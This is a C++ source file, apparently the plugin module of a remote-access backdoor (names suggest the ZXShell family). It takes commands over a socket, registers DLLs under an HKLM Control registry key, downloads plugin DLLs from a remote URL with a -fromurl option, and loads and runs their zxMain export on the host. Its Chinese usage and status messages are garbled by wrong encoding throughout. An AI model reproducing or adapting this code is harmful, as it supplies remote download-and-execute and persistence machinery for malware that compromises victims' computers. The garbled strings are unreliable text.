// ZXPLUG.cpp: implementation of the CZXPLUG class.
//
//////////////////////////////////////////////////////////////////////
#include "..\zxsCommon\zxsWinAPI.h"
#include "ZXPLUG.h"
#include ".\GetOpt.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CZXPLUG::CZXPLUG()
{
	plugkey = "SYSTEM\\CurrentControlSet\\Control\\zxplug";
	m_socket = -1;
	//init();
}

CZXPLUG::~CZXPLUG()
{

}

int CZXPLUG::cmd(MainPara *args)
{
	SOCKET Socket = args->Socket;

	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();

	m_socket = Socket;
	invoke(argc, argv);

	return 1;
}

int CZXPLUG::zxplug(MainPara *args)
{
	SOCKET Socket = args->Socket;

	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();

	CGetOpt cmdopt(argc, argv, false);

	char *Usage = ""
		"zxplug v1.0\r\n"
		"zxplug -list     �г����������Ĳ����Ϣ\r\n"
		"zxplug -add <�Զ�������> <�ļ�·��>\r\n"
		"zxplug -del <�Զ��������>\r\n"
		"zxplug -fromurl <���ز������ַ>\r\n"
		"\r\n"
		"example:\r\n"
		"zxplug -add getxxx c:\\xyz.dll  ��������getxxx, ����ģ��xyz.dll(�����Ѿ��ϴ���)\r\n"
		"zxplug -add getxxx c:\\xyz.dll -fromurl http://x.x.x/x.dll ��ָ��url���ز������װ\r\n"
		"zxplug -del getxxx  ɾ���Զ��������getxxx\r\n";

	m_socket = Socket;

/*
	for(int i=1; i<argc; i++)
	{
		if(argv[i][0] == '-' || argv[i][0] == '/')
		{
			if(!stricmp(&argv[i][1], "list"))
			{
				return getpluglist();
			}
		}else
		{
			if(!stricmp(&argv[i-1][1], "add"))
			{
				if(argc < i+2)
				{
					return SendMessage(m_socket, Usage);
				}
				return add(argv[i], argv[i+1]);
			}else if(!stricmp(&argv[i-1][1], "del"))
			{
				if(argc < i+1)
				{
					return SendMessage(m_socket, Usage);
				}
				return del(argv[i]);
			}
		}
	}
*/
	char *opt1;
	char *opt2;
	char *fromurl;

	if(cmdopt.checkopt("list"))
		return getpluglist();

	fromurl = cmdopt.getstr("fromurl");
	opt1 = cmdopt.getstr("add");
	opt2 = cmdopt.getnextopt();
	if(opt1 && opt2)
	{
		if(fromurl)
		{
			if(iGetFile(Socket, fromurl, opt2, 0) == -1)
			{
				return 0;
			}
		}
		return add(opt1, opt2);
	}

	opt1 = cmdopt.getstr("del");
	if(opt1)
		return del(opt1);

	return SendMessage(m_socket, Usage);
}

void CZXPLUG::init()
{
	DWORD i, retCode;
	HKEY hKey;
	char szCmd[MAX_PATH];
	DWORD cmdLen;
	DWORD type = REG_SZ;
	char szFile[MAX_PATH];
	DWORD pathLen;

	_PLUGINFO PI;

	retCode = ZXSAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		plugkey,
		0,
		KEY_READ,
		&hKey);

	if(retCode != ERROR_SUCCESS)
		return;

	for (i=0; 1; i++)
	{
		cmdLen = MAX_PATH;
		pathLen = MAX_PATH;
		memset(szCmd, 0, sizeof(szCmd));
		memset(szFile, 0, sizeof(szFile));
		if(RegEnumValue(hKey, i, szCmd, &cmdLen, 0, 0, 0, 0) != ERROR_SUCCESS)
			break;
		if(ZXSAPI::RegQueryValueEx(hKey, szCmd, 0, &type, (LPBYTE)szFile, &pathLen) != ERROR_SUCCESS)
			continue;
		int dlltype = checkDll(szFile);
		if(dlltype == -1)
		{
			//dll�ļ���Ч,ɾ����ֵ
			del(szCmd);
			continue;
		}
		strcpy(PI.cmd, szCmd);
		strcpy(PI.filepath, szFile);
		PI.export = dlltype;

		m_pluglist.push_back(PI);
	}
	retCode = GetLastError();

	RegCloseKey(hKey);
	return;
}

bool CZXPLUG::add(char *cmd, char *file)
{
	if(IsPlugCMD(cmd) || regCMDExsited(cmd))
	{
		SendMessage(m_socket, "%s �������Ѵ���, �����Ϊ����.\r\n", cmd);
		return false;
	}

	_PLUGINFO PI;
	int dlltype = checkDll(file);
	if(dlltype == -1)
	{
		SendMessage(m_socket, "ʧ��, dll�޷�����.\r\n");
		return false;
	}else if(dlltype == 0)
	{
		SendMessage(m_socket, "û����zxMain�����������Լ���.\r\n");
	}else if(dlltype == 1)
	{
		SendMessage(m_socket, "dll ���Ϲ��.\r\n");
	}

	DWORD retCode;
	HKEY hKey;
	DWORD dwDisposition;

	retCode = ZXSAPI::RegCreateKeyEx(HKEY_LOCAL_MACHINE,
		plugkey,
		0,
		NULL,
		0,
		KEY_WRITE,
		NULL,
		&hKey,
		&dwDisposition);

	if(retCode != ERROR_SUCCESS)
		return false;

	retCode = ZXSAPI::RegSetValueEx(hKey, cmd, 0, REG_SZ, (BYTE*)file, strlen(file)+1);

	if(retCode != ERROR_SUCCESS)
	{
		SendMessage(m_socket, "�������ʧ��.\r\n");
		return false;
	}

	strcpy(PI.cmd, cmd);
	strcpy(PI.filepath, file);
	PI.export = dlltype;

	m_pluglist.push_back(PI);

	SendMessage(m_socket, "������ӳɹ�. %s\r\n", dlltype?"������������":"");

	return true;
}

bool CZXPLUG::del(char *cmd)
{
	DWORD retCode;
	HKEY hKey;

	for(list<_PLUGINFO>::iterator it = m_pluglist.begin(); it != m_pluglist.end(); )
	{
		if(!stricmp(cmd, it->cmd))
		{
			//ͨ�����������ֱ��ɾ�����ˣ�����ϵͳ������ɾ��
			ZXSAPI::MoveFileEx(it->filepath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
			m_pluglist.erase(it++);
		}
		else
			it++;
	}
	retCode = ZXSAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		plugkey,
		0,
		KEY_SET_VALUE,
		&hKey);

	if(retCode != ERROR_SUCCESS)
		return false;

	retCode = RegDeleteValue(hKey, cmd);

	if(retCode != ERROR_SUCCESS)
	{
		SendMessage(m_socket, "���� %s ɾ��ʧ��.\r\n", cmd);
		return false;
	}

	SendMessage(m_socket, "���� %s ɾ���ɹ�.\r\n", cmd);
	return true;
}

bool CZXPLUG::invoke(int argc, char **argv)
{
	char *pFile = GetPlugPath(argv[0]);
	if(pFile == NULL)
	{
		SendMessage(m_socket, "����, ��ⲻ���ù��ܵ�dll�ļ�.\r\n");
		return false;
	}
	HMODULE hModule = ZXSAPI::GetModuleHandle(pFile);
	if(hModule == NULL)
	{
		hModule = ZXSAPI::LoadLibrary(pFile);
		if(hModule == NULL)
		{
			SendMessage(m_socket, "����, ���δ����.\r\n");
			return false;
		}	
	}


	zxMain pFunc = (zxMain)ZXSAPI::GetProcAddress(hModule, "zxMain");
	if(pFunc == NULL)
	{
		//dllû����zxMain�ӿ�
		SendMessage(m_socket, "����, �Ҳ���Dll����ں���.\r\n");
		return false;
	}

	pFunc(m_socket, argc, argv);

	return true;
}

int CZXPLUG::GetPlugCount(bool flag)
{
	if(flag == false)
		return m_pluglist.size();
	int count = 0;
	for(list<_PLUGINFO>::iterator it = m_pluglist.begin(); it != m_pluglist.end(); it++)
	{
		if(it->export)
			count++;
	}
	return count;
}

int CZXPLUG::GetPlugList(SOCKET Socket)
{
	SendMessage(Socket, "�����ӵ� %d ���������\r\n", GetPlugCount(true));
	for(list<_PLUGINFO>::iterator it = m_pluglist.begin(); it != m_pluglist.end(); it++)
	{
		if(it->export)
			SendMessage(Socket, "%s\r\n", it->cmd);
	}

	return m_pluglist.size();
}

bool CZXPLUG::IsPlugCMD(char *cmd)
{
	for(list<_PLUGINFO>::iterator it = m_pluglist.begin(); it != m_pluglist.end(); it++)
	{
		if(!stricmp(cmd, it->cmd) && it->export)
			return true;
	}
	return false;
}

int CZXPLUG::getpluglist()
{
	SendMessage(m_socket, "����      ��ں���  �ļ�·��\r\n\r\n");
	for(list<_PLUGINFO>::iterator it = m_pluglist.begin(); it != m_pluglist.end(); it++)
	{
		SendMessage(m_socket, "%-15s %s  %s\r\n", it->cmd, it->export?"��":"��",it->filepath);
	}
	SendMessage(m_socket, "�ܹ� %d �����.\r\n", m_pluglist.size());
	return m_pluglist.size();
}

bool CZXPLUG::testplug(char *cmd)
{
	if(!IsPlugCMD(cmd))
	{
		//û��װ����������
		return false;
	}
	if(!ZXSAPI::GetModuleHandle(GetPlugPath(cmd)))
	{
		//���û����
		return false;
	}else
	{
		//����Ѿ�����
		return true;
	}
}

char * CZXPLUG::GetPlugPath(char *cmd)
{
	for(list<_PLUGINFO>::iterator it = m_pluglist.begin(); it != m_pluglist.end(); it++)
	{
		if(!stricmp(cmd, it->cmd))
			return it->filepath;
	}
	return NULL;
}

bool CZXPLUG::regCMDExsited(char *cmd)
{
	DWORD i, retCode;
	HKEY hKey;
	char szCmd[MAX_PATH];
	DWORD cmdLen;

	retCode = ZXSAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		plugkey,
		0,
		KEY_READ,
		&hKey);

	if(retCode != ERROR_SUCCESS)
		return false;

	for (i=0; 1; i++)
	{
		if(RegEnumValue(hKey, i, szCmd, &cmdLen, 0, 0, 0, 0) != ERROR_SUCCESS)
			break;
		if(!stricmp(cmd, szCmd))
		{
			RegCloseKey(hKey);
			return true;
		}
	}

	RegCloseKey(hKey);
	return false;
}

int CZXPLUG::checkDll(char *file)
{
	char szBuf[MAX_PATH] = {0};

	HINSTANCE hDll = LoadLibraryEx(file, NULL, LOAD_LIBRARY_AS_DATAFILE);
	if(!hDll)
	{
		//������Ч��dll�ļ�
		return -1;
	}
	FreeLibrary(hDll);
	hDll = LoadLibrary(file);
	if(!hDll)
	{
		//����dllʧ��
		return -1;
	}
	if(!ZXSAPI::GetProcAddress(hDll, "zxMain"))
	{
		//û����zxMain����
		return 0;
	}
	return 1;
}